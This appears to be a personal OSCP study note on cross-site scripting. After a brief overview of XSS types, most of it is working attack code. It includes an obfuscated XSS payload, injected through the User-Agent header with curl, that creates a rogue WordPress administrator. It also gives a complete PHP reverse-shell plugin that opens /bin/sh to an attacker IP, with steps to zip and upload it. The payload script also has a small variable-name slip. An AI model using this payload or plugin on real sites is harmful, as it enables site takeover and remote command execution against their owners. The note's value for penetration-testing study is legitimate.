---
aliases:
  - Cross-Site Scripting
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - web_application
  - web_app
  - web_app_attack
  - xss
  - cross_site_scripting
author: Mehdi N Tehrani
creat_date: 2023-12-23
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Types

## Reflected
#reflected #reflected_xss
usually include the payload in a crafted request or link. The web application takes this value and places it into the page content. This XSS variant only attacks the person submitting the request or visiting the link. Reflected XSS vulnerabilities can often occur in *search fields and results*, as well as *anywhere user input is included in error messages*.
## Stored / Persistent
#stored #persistent #stored_xss
when the exploit payload is stored in a database or otherwise cached by a server. The web application then retrieves this payload and displays it to anyone who visits a vulnerable page. A single Stored XSS vulnerability can therefore attack all site users. Stored XSS vulnerabilities often exist in *forum software*, especially in *comment sections*, in *product reviews*, or *wherever user content can be stored and reviewed later*.
## DOM-Based
#dom_based_xss #dom_based
DOM-based XSS can be **stored** or **reflected**
Takes place solely within the page's Document Object Model (DOM). This type of XSS occurs *when a page's DOM is modified with user-controlled values*. The key is that DOM-based XSS attacks occur when a browser parses the page's content and inserted JavaScript is executed.

# Outcome of XSS
- session hijacking
- forced redirection to malicious pages
- execution of local applications as that user
- trojanized web applications

# Characters of interest
The most common special characters used for this purpose include:
```
< > ' " { } ;
```

# Privilege Escalation 
#xss_privesc #privesc 


## Tools
#jscompress #javascript #compression #compress
https://jscompress.com/

## Exploit
### 1. Identify the field vulnerable to XSS
content of User-Agent gets displayed in the **visitors** plugin
### 2. Create payload
```
var xhr1 = new XMLHttpRequest();
var URL = "/wp-admin/user-new.php";
xhr1.open("GET", URL, false);
xhr1.send();
var nonceregx= /create-user"\svalue="([^"].*?)"/g;
var nonceMatch = nonceregx.exec(xhr.responseText);
var nonce = nonceMatch[1];

var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@mydm.ab&pass1=attackerpassword&pass2=attackerpassword&role=administrator";
var xhr2 = new XMLHttpRequest();
xhr2.open("POST", URL, true);
xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr2.send(params);
```

### 3. Compress payload
Use https://jscompress.com/ to compress the javascript payload

### 4. Encode javascript code to UTF-16 char bytes
```
function encode_js_to_bytes(text) {
   let out = ''
   for (i in text) {
      out += text.charCodeAt(i)
      if (i < text.length - 1) out += ','
   }
   return out
}
```

### 5. Build script element to inject into user-agent header
```
let encoded_script = encode_js_to_bytes(script)
User-Agent <script>eval(String.fromCharCode(encoded_script))</script>
```

```
curl -i http://offsecwp/ --proxy 127.0.0.1:8080 --user-agent '<script>eval(String.fromCharCode(118,97,114,32,120,104,114,49,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,59,120,104,114,49,46,111,112,101,110,40,34,71,69,84,34,44,85,82,76,44,33,49,41,44,120,104,114,49,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,114,101,103,120,61,47,99,114,101,97,116,101,45,117,115,101,114,34,115,118,97,108,117,101,61,34,40,91,94,34,93,46,42,63,41,34,47,103,44,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,114,101,103,120,46,101,120,101,99,40,120,104,114,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,109,121,100,109,46,97,98,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,119,111,114,100,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,119,111,114,100,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,44,120,104,114,50,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,59,120,104,114,50,46,111,112,101,110,40,34,80,79,83,84,34,44,85,82,76,44,33,48,41,44,120,104,114,50,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,120,104,114,50,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>'
```


# Build wordpress plugin
#wordpress_plugin #reverse_shell 
`add_action('init', 'func_name')`: binds `func_name` function to wordpress `init` hook.

#wordpress_plugin #action #filter 
Wordpress plugin **action**, takes an input, processes it but doesn't return anything.
A plugin **filter** however, returns something as well.

The header is required for wordpress to accept this php file as a wordpress plugin
```php
<?php
/*
Plugin Name:  RevShell
Plugin URI:   https://www.attacker.att/rev.shell
Description:  Get a reverse shell
Version:      1.0
Author:       Attacker
Author URI:   https://www.attacker.att
License:      GPL2
License URI:  https://www.gnu.org/licenses/gpl-2.0.html
Text Domain:  rev-shell
Domain Path:  /
*/

function rev(){
   	set_time_limit (0);
	$VERSION = "1.0";
	$ip = '192.168.45.216';  // CHANGE THIS
	$port = 7777;       // CHANGE THIS
	$chunk_size = 1400;
	$write_a = null;
	$error_a = null;
	$shell = 'uname -a; w; id; /bin/sh -i';
	$daemon = 0;
	$debug = 0;

	//
	// Daemonise ourself if possible to avoid zombies later
	//

	// pcntl_fork is hardly ever available, but will allow us to daemonise
	// our php process and avoid zombies.  Worth a try...
	if (function_exists('pcntl_fork')) {
		// Fork and have the parent process exit
		$pid = pcntl_fork();
		
		if ($pid == -1) {
			printit("ERROR: Can't fork");
			exit(1);
		}
		
		if ($pid) {
			exit(0);  // Parent exits
		}

		// Make the current process a session leader
		// Will only succeed if we forked
		if (posix_setsid() == -1) {
			printit("Error: Can't setsid()");
			exit(1);
		}

		$daemon = 1;
	} else {
		printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
	}

	// Change to a safe directory
	chdir("/");

	// Remove any umask we inherited
	umask(0);

	//
	// Do the reverse shell...
	//

	// Open reverse connection
	$sock = fsockopen($ip, $port, $errno, $errstr, 30);
	if (!$sock) {
		printit("$errstr ($errno)");
		exit(1);
	}

	// Spawn shell process
	$descriptorspec = array(
	   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
	   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
	   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
	);

	$process = proc_open($shell, $descriptorspec, $pipes);

	if (!is_resource($process)) {
		printit("ERROR: Can't spawn shell");
		exit(1);
	}

	// Set everything to non-blocking
	// Reason: Occsionally reads will block, even though stream_select tells us they won't
	stream_set_blocking($pipes[0], 0);
	stream_set_blocking($pipes[1], 0);
	stream_set_blocking($pipes[2], 0);
	stream_set_blocking($sock, 0);

	printit("Successfully opened reverse shell to $ip:$port");

	while (1) {
		// Check for end of TCP connection
		if (feof($sock)) {
			printit("ERROR: Shell connection terminated");
			break;
		}

		// Check for end of STDOUT
		if (feof($pipes[1])) {
			printit("ERROR: Shell process terminated");
			break;
		}

		// Wait until a command is end down $sock, or some
		// command output is available on STDOUT or STDERR
		$read_a = array($sock, $pipes[1], $pipes[2]);
		$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

		// If we can read from the TCP socket, send
		// data to process's STDIN
		if (in_array($sock, $read_a)) {
			if ($debug) printit("SOCK READ");
			$input = fread($sock, $chunk_size);
			if ($debug) printit("SOCK: $input");
			fwrite($pipes[0], $input);
		}

		// If we can read from the process's STDOUT
		// send data down tcp connection
		if (in_array($pipes[1], $read_a)) {
			if ($debug) printit("STDOUT READ");
			$input = fread($pipes[1], $chunk_size);
			if ($debug) printit("STDOUT: $input");
			fwrite($sock, $input);
		}

		// If we can read from the process's STDERR
		// send data down tcp connection
		if (in_array($pipes[2], $read_a)) {
			if ($debug) printit("STDERR READ");
			$input = fread($pipes[2], $chunk_size);
			if ($debug) printit("STDERR: $input");
			fwrite($sock, $input);
		}
	}

	fclose($sock);
	fclose($pipes[0]);
	fclose($pipes[1]);
	fclose($pipes[2]);
	proc_close($process);

	
}

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

add_action('init', 'rev'); 
```

## Compress and upload
```
zip plugin.zip plugin.php
```